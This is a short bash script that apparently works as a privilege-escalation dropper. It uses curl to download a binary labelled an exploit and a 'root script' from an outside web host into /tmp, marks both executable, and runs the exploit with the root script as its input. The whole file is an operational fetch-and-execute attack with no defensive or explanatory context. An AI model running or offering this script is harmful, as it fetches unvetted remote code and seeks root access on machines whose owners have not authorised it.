#!/bin/bash

#echo "Downloading exploit..."
curl https://erikboesen.com/downloads/elevate.out --output /tmp/elevate.out
chmod +x /tmp/elevate.out

#echo "Downloading root script..."
curl https://erikboesen.com/downloads/enact.sh --output /tmp/enact.sh
chmod +x /tmp/enact.sh

# Run root script as
/tmp/elevate.out <<EOF
/tmp/enact.sh
EOF
